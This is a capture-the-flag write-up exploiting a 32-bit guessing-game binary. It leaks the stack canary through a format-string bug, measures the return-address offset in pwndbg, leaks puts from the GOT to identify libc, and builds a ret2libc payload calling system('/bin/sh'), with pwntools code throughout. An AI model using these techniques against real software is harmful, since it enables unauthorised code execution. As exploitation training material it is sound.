
## Guess the number

From the source code, we know the number is calculated with ``rand`` address.

```python
(rand % 4096) + 1
```

The address might change when the program starts everytime, so we could search the number in range *[-4096, 4096]*.

## Disassemble the program

Run ``radare2`` to disassemble the program

```bash
 r2 ./vuln
```

Execute ``pd $s > vuln.asm`` in r2, exam output *vuln.asm*, the canary is loaded from ``gs:[0x14]``, which stored a random generated number, into ``[ebp-0xc]``. Before the function returns, the canary is checked and call ``__stack_chk_fail_local`` on failed. The canary changes everytime the program start running, but the location on stack is fixed, so we need to find the canary address.

```asm
0x08048783      65a114000000   mov eax, dword gs:[0x14]
0x08048789      8945f4         mov dword [ebp - 0xc], eax
0x0804878c      31c0           xor eax, eax
...
0x080487e9      8b45f4         mov eax, dword [ebp - 0xc]
0x080487ec      653305140000.  xor eax, dword gs:[0x14]
0x080487f3      7405           je 0x80487fa
0x080487f5      e816010000     call sym.__stack_chk_fail_local
0x080487fa      8b5dfc         mov ebx, dword [ebp - 4]
0x080487fd      c9             leave
0x080487fe      c3             ret
```

## Find canary

The winner name buffer allow us to input something, use the ``printf`` format string to print positional parameters, '%N$lx' for the Nth parameter.

```python
num = None
for i in range(1, 200):
    if num is None:
        num = must_guess(pr)
    else:
        pr.sendlineafter("What number would you like to guess?\n", str(num))
    pr.readline()
    pr.sendlineafter("New winner!\nName? ", 'XXX %{}$lx'.format(i))
    print(i, pr.readline())
```

In the output, several lines suspicious, like 20th, 119th and 166th.

```bash
...
18 b'Congrats: XXX 0\n'
19 b'Congrats: XXX 1\n'
20 b'Congrats: XXX 1cdadcae\n'   canary?
21 b'Congrats: XXX 79804f\n'
22 b'Congrats: XXX fffff7e0\n'
...
116 b'Congrats: XXX f7f69d20\n'
117 b'Congrats: XXX 1c\n'
118 b'Congrats: XXX ff8e5238\n'
119 b'Congrats: XXX 1fc74300\n'  canary?
120 b'Congrats: XXX f7f69d20\n'
121 b'Congrats: XXX a\n'
...
164 b'Congrats: XXX 0\n'
165 b'Congrats: XXX 73fe43f7\n'
166 b'Congrats: XXX db4605e7\n'   canary?
167 b'Congrats: XXX 0\n'
...
```

Run the program from gdb, set a breakpoint at *0x080487e9*, where to load the prestored canary value into *eax*.

```bash
pwndbg> b *0x080487e9
Breakpoint 1 at 0x80487e9
```
By checking the suspicious lines, the 119th looks like what we are looking for.

```bash
What number would you like to guess?
-2815
Congrats! You win! Your prize is this print statement!

New winner!
Name? %119$lx
Congrats: 9ef1d800
```

Execute one step forward and check the value in *eax*. which means the value at 119th indeed is the canary value. 

```bash
pwndbg> si
0x080487ec in win ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────
*EAX  0x9ef1d800
 EBX  0x8049fbc (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049ec4 (_DYNAMIC) ◂— 0x1
 ECX  0xffffffff
 EDX  0xffffffff
 EDI  0xf7edc000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7edc000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0xff812258 —▸ 0xff812278 ◂— 0x0
 ESP  0xff812040 ◂— 0x1
*EIP  0x80487ec (win+126) ◂— xor    eax, dword ptr gs:[0x14]
──────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────
   0x80487e9 <win+123>    mov    eax, dword ptr [ebp - 0xc]
 ► 0x80487ec <win+126>    xor    eax, dword ptr gs:[0x14]
   0x80487f3 <win+133>    je     win+140 <win+140>
    ↓
   0x80487fa <win+140>    mov    ebx, dword ptr [ebp - 4]
   0x80487fd <win+143>    leave  
   0x80487fe <win+144>    ret    
 
   0x80487ff <main>       lea    ecx, [esp + 4]
   0x8048803 <main+4>     and    esp, 0xfffffff0
   0x8048806 <main+7>     push   dword ptr [ecx - 4]
   0x8048809 <main+10>    push   ebp
   0x804880a <main+11>    mov    ebp, esp
```

## Find EIP address

We need to find EIP address to figure out how many padding do we need.
Run the program in ``gdb``, set a breakpoint at *leave* instruction in ``win``, feed it 100 'A'.

```bash
pwndbg> b *0x080487fd
Breakpoint 1 at 0x80487fd
pwndbg> r
Starting program: /home/zlynch-picoctf/vuln 
warning: Error disabling address space randomization: Operation not permitted
Welcome to my guessing game!
Version: 2

What number would you like to guess?
-2815
Congrats! You win! Your prize is this print statement!

New winner!
Name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Now it breaks, check the first 32 words at the top of the stack. The *0x41414141* block starts at *0xffce1d7c*, so we know this is where the buffer starts.

```bash
pwndbg> x/32wx $esp
0xffce1d70:     0x00000001      0xfffff501      0xfffff501      0x41414141
0xffce1d80:     0x41414141      0x41414141      0x41414141      0x41414141
0xffce1d90:     0x41414141      0x41414141      0x41414141      0x41414141
0xffce1da0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffce1db0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffce1dc0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffce1dd0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffce1de0:     0x00000000      0x00000000      0x00000000      0x00000000
```

Use ``info frame`` to find out where EIP is. *eip at 0xffce1f8c* in *saved registers* section tell us exactly what we are looking for.

```bash
pwndbg> info frame
Stack level 0, frame at 0xffce1f90:
 eip = 0x80487fd in win; saved eip = 0x804888c
 called by frame at 0xffce1fc0
 Arglist at 0xffce1f88, args: 
 Locals at 0xffce1f88, Previous frame's sp is 0xffce1f90
 Saved registers:
  ebx at 0xffce1f84, ebp at 0xffce1f88, eip at 0xffce1f8c
```

By calculating the distance between EIP address and buffer address we know the padding is *528*. The buffer size is 512 bytes and canary is 4 bytes, so we need another 12 bytes of padding before EIP.

```bash
pwndbg> p/d 0xffce1f8c-0xffce1d7c 
$1 = 528
```

We need to add 12 bytes padding to get to EIP after canary.


## Find version of libc 

Now we need to call ``puts`` to print the address of itself, the payload would be 

```padding(512bytes) + canary + padding(12bytes) + puts plt address + win address + puts got address```

Find address of ``puts`` on server by running the script. 

```python
elf = pwn.ELF(target, False)
payload = b'A' * 512 + pwn.p32(canary) + b'B'*12
payload += pwn.p32(elf.plt['puts'])
payload += pwn.p32(elf.sym['win'])
payload += pwn.p32(elf.got['puts'])
pr.sendlineafter("What number would you like to guess?\n", str(num))
pr.sendlineafter("New winner!\nName? ", payload)
pr.readline()
pr.readline()
puts_addr = pwn.u32(pr.readline()[:4])
```

With the address we found matches using website [libc database search](https://libc.blukat.me/?q=puts%3A0xf7dab3d0&l=libc6-i386_2.27-3ubuntu1.2_amd64)

```html
Matches
libc6-i386_2.27-3ubuntu1.2_amd64
```

Find ``system`` offset and `str_bin_sh` offset from [libc6-i386_2.27-3ubuntu1.2_amd64](https://libc.blukat.me/d/libc6-i386_2.27-3ubuntu1.2_amd64.symbols). Then the addresses could be calculated.

```python
libc_base = puts_addr - 0x673d0
sys_addr = libc_base + 0x3cd80
binsh_addr = libc_base + 0x17bb8f
```

## Get shell

To get shell we need to call ``system`` with argument ``/bin/sh``. Again as ``win`` has been called when we try to find address of ``puts``, now we just send the payload when winner name is asked. 
The payload follow format 

```padding(512bytes) + canary + padding(12bytes) + system address + win address + string bin sh address```

```python
payload = b'A' * 512 + pwn.p32(canary) + b'B'*12
payload += pwn.p32(sys_addr)
payload += pwn.p32(elf.sym['win'])
payload += pwn.p32(binsh_addr)
```

Finally, combine them all to get shell and get the flag. 
